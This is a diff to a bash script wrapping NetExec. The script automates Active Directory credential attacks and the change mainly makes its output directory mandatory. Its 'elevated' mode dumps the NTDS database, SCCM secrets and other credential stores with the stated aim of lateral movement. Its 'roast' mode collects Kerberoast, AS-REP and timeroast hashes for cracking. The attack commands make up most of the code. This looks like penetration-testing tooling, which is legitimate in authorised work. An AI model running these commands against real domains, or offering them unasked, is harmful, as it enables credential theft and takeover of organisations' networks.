@@ -10,7 +10,7 @@ NC="${C}[0m"
 
 # ───────── Usage ──────────
 usage() {
-  echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc>) [-o <output-dir>] [--local-auth]"
+  echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc>) -o <output-dir> [--local-auth]"
   echo ""
   echo "  <mode>        elevated | verify | roast"
   echo "                  elevated: Requires elevated privileges (local admin+) to extract credentials and interesting information for lateral movement"
@@ -20,7 +20,7 @@ usage() {
   echo "  -H            NTLM hash"
   echo "  --aesKey      Kerberos AES key (requires --kdcHost)"
   echo "  --kdcHost     Domain Controller to contact (used with --aesKey)"
-  echo "  -o            Output directory (optional, will be created if it doesn't exist)"
+  echo "  -o            Output directory (will be created if it doesn't exist)"
   echo "  --local-auth  Specify if it's a local account (ignored with --aesKey)"
   echo "  -h            Show this help"
   exit 1
@@ -80,7 +80,7 @@ while [[ $# -gt 0 ]]; do
 done
 
 # ───────── Validate Arguments ──────────
-if [[ -z "$MODE" || -z "$TARGET" || -z "$USER" ]]; then
+if [[ -z "$MODE" || -z "$TARGET" || -z "$USER" || -z "$OUTDIR" ]]; then
   usage
 fi
 
@@ -109,66 +109,44 @@ else
   fi
 fi
 
-if [[ -n "$OUTDIR" ]]; then
-  if [[ "$MODE" == "verify" ]]; then
-    LOGFILE="$OUTDIR"/"${USER}_${MODE}.log"
-  else
-    LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
-  fi
-
-  if [[ "$MODE" == "elevated" ]]; then
-    CREDFILE="$OUTDIR"/"${TARGET}_creds.log"
-    INTERESTINGFILE="$OUTDIR"/"${TARGET}_interesting.log"
-  fi
-
-  mkdir -p "$OUTDIR"
-  touch "$LOGFILE"
+if [[ "$MODE" == "verify" ]]; then
+  LOGFILE="$OUTDIR"/"${USER}_${MODE}.log"
+else
+  LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
 fi
+
+if [[ "$MODE" == "elevated" ]]; then
+  CREDFILE="$OUTDIR"/"${TARGET}_creds.log"
+  INTERESTINGFILE="$OUTDIR"/"${TARGET}_interesting.log"
+fi
+
+mkdir -p "$OUTDIR"
+touch "$LOGFILE"
 
 log() {
   local msg="$1"
   local additional_file="$2"
   
-  if [[ -n "$LOGFILE" ]]; then
-    if [[ -n "$additional_file" ]]; then
-      echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE" | tee -a "$additional_file"
-    else
-      echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE"
-    fi
+  if [[ -n "$additional_file" ]]; then
+    echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE" | tee -a "$additional_file"
   else
-    echo -e "${BLUE}[+]${NC} $msg"
+    echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE"
   fi
 }
 
 run_nxc() {
   log "Running: $*"
-  if [[ -n "$LOGFILE" ]]; then
-    unbuffer $* | tee -a "$LOGFILE"
-  else
-    unbuffer $*
-  fi
+  unbuffer $* | tee -a "$LOGFILE"
 }
 
 run_nxc_creds() {
   log "Running: $*" "$CREDFILE"
-  if [[ -n "$LOGFILE" && -n "$CREDFILE" ]]; then
-    unbuffer $* | tee -a "$LOGFILE" | tee -a "$CREDFILE"
-  elif [[ -n "$LOGFILE" ]]; then
-    unbuffer $* | tee -a "$LOGFILE"
-  else
-    unbuffer $*
-  fi
+  unbuffer $* | tee -a "$LOGFILE" | tee -a "$CREDFILE"
 }
 
 run_nxc_interesting() {
   log "Running: $*" "$INTERESTINGFILE"
-  if [[ -n "$LOGFILE" && -n "$INTERESTINGFILE" ]]; then
-    unbuffer $* | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
-  elif [[ -n "$LOGFILE" ]]; then
-    unbuffer $* | tee -a "$LOGFILE"
-  else
-    unbuffer $*
-  fi
+  unbuffer $* | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
 }
 
 # build base auth flags
@@ -203,11 +181,7 @@ elevated)
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sccm
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M ntdsutil
   log "Running: nxc smb $TARGET $AUTH_ARGS --ntds" "$CREDFILE"
-  if [[ -n "$LOGFILE" && -n "$CREDFILE" ]]; then
-    script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"
-  else
-    printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds
-  fi
+  script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"
   
   # Interesting information commands
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M bitlocker
@@ -236,53 +210,44 @@ elevated)
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mobaxterm
 
 
-  if [[ -n "$OUTDIR" ]]; then
-    log "Extracting potential credential lines…"
-    CREDFILE_PARSED="$OUTDIR"/"${TARGET}_creds_parsed.txt"
-    awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' "$CREDFILE" |
-      rg -a '^\x1b\[1;33m|^Node' |
-      sed -r 's/\x1b\[[0-9;]*m//g' |
-      sort -u >"$CREDFILE_PARSED"
+  log "Extracting potential credential lines…"
+  CREDFILE_PARSED="$OUTDIR"/"${TARGET}_creds_parsed.txt"
+  awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' "$CREDFILE" |
+    rg -a '^\x1b\[1;33m|^Node' |
+    sed -r 's/\x1b\[[0-9;]*m//g' |
+    sort -u >"$CREDFILE_PARSED"
 
-    # Check for GMSA account
-    if grep -qF "SC_GMSA" "$CREDFILE"; then
-      GMSA_MSG="GMSA Account found! See Extract gMSA Secrets in wiki"
-      echo -e "${BLUE}[+]${NC} $GMSA_MSG" | tee -a "$LOGFILE" | tee -a "$CREDFILE_PARSED"
-    fi
-
-    echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
-    echo -e "${GREEN}[✓] Credentials (raw):    ${CREDFILE}"
-    echo -e "${GREEN}[✓] Credentials (parsed): ${CREDFILE_PARSED}"
-    echo -e "${GREEN}[✓] Interesting info:     ${INTERESTINGFILE}"
+  # Check for GMSA account
+  if grep -qF "SC_GMSA" "$CREDFILE"; then
+    GMSA_MSG="GMSA Account found! See Extract gMSA Secrets in wiki"
+    echo -e "${BLUE}[+]${NC} $GMSA_MSG" | tee -a "$LOGFILE" | tee -a "$CREDFILE_PARSED"
   fi
+
+  echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
+  echo -e "${GREEN}[✓] Credentials (raw):    ${CREDFILE}"
+  echo -e "${GREEN}[✓] Credentials (parsed): ${CREDFILE_PARSED}"
+  echo -e "${GREEN}[✓] Interesting info:     ${INTERESTINGFILE}"
   ;;
 
 verify)
   log "Starting service verification…"
   run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
+  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --query "(sAMAccountName=$USER)" "sAMAccountName memberOf"
   run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
   run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
   run_nxc nxc ssh "$TARGET" $BASE_AUTH_ARGS
   run_nxc nxc mssql "$TARGET" $BASE_AUTH_ARGS
 
-  if [[ -n "$LOGFILE" ]]; then
-    sed 's/\r/\n/g' "$LOGFILE" | rg -v Running >"$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
-    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
-  fi
+  sed 's/\r/\n/g' "$LOGFILE" | rg -v Running >"$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
+  echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
   ;;
 
 roast)
   log "Starting kerberoast & asreproast…"
-  if [[ -n "$OUTDIR" ]]; then
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
-    run_nxc nxc smb "$TARGET" -M timeroast "$OUTDIR/timeroast.hash"
-    echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
-    echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
-  else
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting /dev/stdout
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast /dev/stdout
-    run_nxc nxc smb "$TARGET" -M timeroast /dev/stdout
-  fi
+  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
+  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
+  run_nxc nxc smb "$TARGET" -M timeroast "$OUTDIR/timeroast.hash"
+  echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
+  echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
   ;;
 esac
